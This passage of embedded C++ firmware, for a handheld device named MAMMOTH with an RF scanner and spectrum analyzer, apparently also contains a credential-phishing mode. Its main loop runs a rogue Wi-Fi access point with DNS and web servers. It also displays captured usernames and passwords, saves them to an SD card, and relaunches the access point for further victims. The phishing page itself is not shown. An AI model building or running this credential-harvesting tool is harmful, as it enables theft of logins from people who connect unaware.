  if (abs(newCenter - saCenterFreq) > 0.05) {
    saCenterFreq = newCenter;
    saUpdateFreqArray();
    for (int i = 0; i < SA_NUM_BARS; i++) {
      saPeakValues[i] = -138;
    }
  }

  if (millis() - saLastScanTime > saScanInterval) {
    saLastScanTime = millis();
    saScanSpectrum();
    drawSpectrum();
    drawCenterInfo();
  }
}

// ============================================================
// === SETUP ===
// ============================================================
void setup() {
  Serial.begin(115200);
  isolateSPI();
  delay(500);
  analogReadResolution(12);
  analogSetAttenuation(ADC_11db);
  for (int i = 0; i < FILTER_SIZE; i++) potFilter[i] = analogRead(POT_PIN);

  tft.init();
  delay(100);
  tft.setRotation(0);
  tft.fillScreen(TFT_BLACK);

  // 🦣 Заставка Mammoth
  drawBootScreen();

  // Настройка кнопки
  menuButton.setClickTicks(600);
  menuButton.setPressTicks(800);
  menuButton.attachClick(handleClick);
  menuButton.attachDoubleClick(handleDoubleClick);

  initCC1101();
  drawMenu();
  Serial.println("=== MAMMOTH v1.0 Ready ===");
  Serial.println("[BTN] Click=Select | DblClick=Exit Menu");
}

// ============================================================
// === LOOP ===
// ============================================================
void loop() {
  menuButton.tick();

  if (currentMode == 0) {
    updateMenuSelection();
  }
  else if (currentMode == 1) {
    dnsServer.processNextRequest();
    webServer.handleClient();
    if (dataCaptured) {
      tft.fillScreen(TFT_BLACK);
      tft.drawCircle(120, 120, 118, TFT_RED);
      tft.setTextColor(TFT_RED, TFT_BLACK);
      tft.setTextSize(2);
      tft.setCursor(30, 60);
      tft.println("> CAPTURED!");
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.setTextSize(1);
      tft.setCursor(25, 100);
      tft.print("> U: "); tft.println(capturedUser);
      tft.setCursor(25, 120);
      tft.print("> P: "); tft.println(capturedPass);
      tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.setCursor(25, 160);
      tft.println("> Saved to SD!");
      delay(3000);
      dataCaptured = false;
      startWiFiAP();
    }
  }
  else if (currentMode == 2) {
    int potValue = readPotFiltered();
    int targetLine = potValue / 205;
    if (targetLine < 0) targetLine = 0;
    if (targetLine > 19) targetLine = 19;
    if (abs(targetLine - logStartLine) >= 1) {
      logStartLine = targetLine;
      viewLogs();
    }
  }
  else if (currentMode == 3) {
    handleRfScanner();
  }
  else if (currentMode == 4) {
    handleSpectrumAnalyzer();
  }
}
